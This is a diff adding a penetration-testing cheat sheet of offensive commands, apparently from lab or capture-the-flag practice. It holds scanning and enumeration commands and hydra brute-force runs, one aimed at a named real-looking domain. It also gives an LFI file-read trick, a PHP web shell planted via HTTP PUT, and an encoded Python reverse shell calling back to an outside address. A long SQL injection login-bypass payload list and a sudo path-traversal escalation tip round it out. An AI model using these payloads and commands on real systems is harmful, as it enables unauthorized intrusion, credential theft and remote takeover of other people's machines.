@@ -1,0 +1,220 @@
+Check for 
+Mountable shares
+http-proxy port for proxytunneling
+hidden directories using dirb or dirbuster
+
+// WORDPRESS
+Critical file containing DB credentials in Wordpress - wp-config.php
+
+//LINUX
+
+sort fsocity.dic | uniq > fsocity_uniq.dic //sort out unique words from file and pipe them to new file
+wc -l //wordcount in a file
+
+lsof -i :<port number> //to get service running on ports
+
+smb://<IP>/share$ //mounting of share in nautilus
+
+which python //check if python is installed
+python -c 'import pty; pty.spawn("/bin/sh")' //spawning advanced shell
+
+//HYDRA
+
+hydra -vv -L usernamefile -P passwordfile 10.10.10.109 http-post-form 'wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid Username'
+
+//*ENUMERATION*//
+
+//enum4linux
+
+//NMAP
+nmap -sV -p- -Pn -n -v <IP> -T5
+nmap -sT -p- -Pn -n -v <IP> -T5
+nmap -v -p 1-65535 -sV -O -sT <IP> //Fastest
+nmap -T4 -A -v <IP> //ALL Scan
+
+nmap -sS -sV –script=vulscan/vulscan.nse target
+nmap -sS -sV –script=vulscan/vulscan.nse –script-args vulscandb=scipvuldb.csv target
+nmap -sS -sV –script=vulscan/vulscan.nse –script-args vulscandb=scipvuldb.csv -p80 target
+nmap -PN -sS -sV –script=vulscan –script-args vulscancorrelation=1 -p80 target
+nmap -sV –script=vuln target
+nmap -PN -sS -sV –script=all –script-args vulscancorrelation=1 target
+nmap -sS -sV -D IP1,IP2,IP3,IP4,IP5 -f –mtu=24 –data-length=1337 -T2 target ( Randomize scan form diff IP)
+nmap -Pn -T2 -sV –randomize-hosts IP1,IP2
+nmap –script smb-check-vulns.nse -p445 target (using NSE scripts)
+nmap -sU -P0 -T Aggressive -p123 target (Aggresive Scan T1-T5)
+nmap -sA -PN -sN target
+nmap -sS -sV -T5 -F -A -O target (version detection)
+nmap -sU -v target (Udp)
+nmap -sU -P0 (Udp)
+nmap -sC 192.168.31.10-12 (all scan default)
+
+// NMAP Vuln Scanner
+mkdir /usr/share/nmap/scripts/vulscan
+cd /usr/share/nmap/scrripts/vulscan
+wget http://www.computec.ch/projekte/vulscan/download/nmap_nse_vulscan-2.0.tar.gz && tar xzf nmap_nse_vulscan-2.0.tar.gz
+
+// Netcat Scanning:
+nc -v -w 1 target -z 1-1000
+for i in {10..12}; do nc -vv -n -w 1 192.168.34.$i 21-25 -z; done
+
+//US Scanning
+us -H -msf -Iv 192.168.31.20 -p 1-65535 && us -H -mU -Iv 192.168.31.20 -p 1-65535
+
+//Unicornscan Scanning
+unicornscan X.X.X.X:a -r10000 -v
+
+//Kernel Scanning:
+xprobe2 -v -p tcp:80:open 192.168.6.66
+
+//Samba Enumeration (RPC and SMB Scanning)
+nmblookup -A target
+smbclient //MOUNT/share -I target -N
+rpcclient -U “” target
+enum4linux target
+rpcinfo -p <>
+
+//SNMP ENumeration:
+snmpget -v 1 -c public IP version
+snmpwalk -v 1 -c public IP
+snmpbulkwalk -v 2 -c public IP
+
+
+//NFS
+If you see NFS port open, try:
+showmount --export <>
+showmount --all <>
+	
+and if any export dir is available, try mounting it using:
+mount <>:/home/vulnix /mnt/vulnix/
+
+
+//NIKTO
+If Nikto gives an output which says + /config.php: PHP Config file may contain database IDs and passwords, LFI protection can be bypassed to read the file config.php as following:
+http://172.16.168.131/?page=php://filter/convert.base64-encode/resource=config
+
+//CURL
+curl -v -X OPTIONS <URL> //check for available HTTP methods
+
+If PUT method is found, use:
+curl -v -X PUT -d '<?php system($_GET["cmd"]); ?>' <URL>/shell.php
+The cmd can be invoked as - http://172.16.168.132/test/shell.php?cmd=id
+
+
+//REVERSE SHELLS
+
+curl "http://172.16.168.132/test/shell.php?cmd=python%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket(socket.AF_INET%2Csocket.SOCK_STREAM)%3Bs.connect((%22172.16.168.1%22%2C443))%3Bos.dup2(s.fileno()%2C0)%3B+os.dup2(s.fileno()%2C1)%3B+os.dup2(s.fileno()%2C2)%3Bp%3Dsubprocess.call(%5B%22%2Fbin%2Fsh%22%2C%22-i%22%5D)%3B%27" //Python
+
+// SQL INJECTION
+
+//BASIC CHECKS
+Authentication bypass
+'-'
+' '
+'&'
+'^'
+'*'
+' or ''-'
+' or '' '
+' or ''&'
+' or ''^'
+' or ''*'
+"-"
+" "
+"&"
+"^"
+"*"
+" or ""-"
+" or "" "
+" or ""&"
+" or ""^"
+" or ""*"
+or true--
+" or true--
+' or true--
+") or true--
+') or true--
+' or 'x'='x
+') or ('x')=('x
+')) or (('x'))=(('x
+" or "x"="x
+") or ("x")=("x
+")) or (("x"))=(("x
+or 2 like 2
+or 1=1
+or 1=1--
+or 1=1#
+or 1=1/*
+admin' --
+admin' #
+admin'/*
+admin' or '2' LIKE '1
+admin' or 2 LIKE 2--
+admin' or 2 LIKE 2#
+admin') or 2 LIKE 2#
+admin') or 2 LIKE 2--
+admin') or ('2' LIKE '2
+admin') or ('2' LIKE '2'#
+admin') or ('2' LIKE '2'/*
+admin' or '1'='1
+admin' or '1'='1'--
+admin' or '1'='1'#
+admin' or '1'='1'/*
+admin'or 1=1 or ''='
+admin' or 1=1
+admin' or 1=1--
+admin' or 1=1#
+admin' or 1=1/*
+admin') or ('1'='1
+admin') or ('1'='1'--
+admin') or ('1'='1'#
+admin') or ('1'='1'/*
+admin') or '1'='1
+admin') or '1'='1'--
+admin') or '1'='1'#
+admin') or '1'='1'/*
+1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
+admin" --
+admin" #
+admin"/*
+admin" or "1"="1
+admin" or "1"="1"--
+admin" or "1"="1"#
+admin" or "1"="1"/*
+admin"or 1=1 or ""="
+admin" or 1=1
+admin" or 1=1--
+admin" or 1=1#
+admin" or 1=1/*
+admin") or ("1"="1
+admin") or ("1"="1"--
+admin") or ("1"="1"#
+admin") or ("1"="1"/*
+admin") or "1"="1
+admin") or "1"="1"--
+admin") or "1"="1"#
+admin") or "1"="1"/*
+1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
+
+//SQLMAP
+
+./sqlmap.py -v 2 --url=http://10.10.10.110/login.php --delay=1 --timeout=15 --retries=2 --keep-alive --threads=5 --batch --dbms=MySQL --data="email=test&password=test" --method=POST -p password
+
+// HTTP-PROXY PORT
+If HTTP-PROXY port is open, use proxytunnel to connect to it as following example:
+proxytunnel -p <IP Address of Machine on Which HTTP Proxy Service is running:HTTP Proxy service port> -d 127.0.0.1:22 -a 4444
+Connect ssh as - ssh sara@127.0.0.1 -p 4444  "/bin/sh"
+
+//* PRIVILEGE ESCALATION *//
+
+//LOCAL PRIVILEGE ESCALATION TIPS (Linux)
+Check for Cron jobs
+Check for sudo permissions using sudo -l. If you see something like this in the output - /bin/cat /accounts/*, (root) /bin/ls /accounts/*, this means that directory traversal is possible for this account and it can be exploited as following - sudo /bin/ls /accounts/../../root
+
+//*PASSWORD CRACKING*//
+hydra -l palgroupadmin -P /home/ganesh/Downloads/rockyou.txt www.palgroup.com -V http-form-post "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&testcookie=1:F=is incorrect" //hydra for http in form login
+
+
+
+
+
+
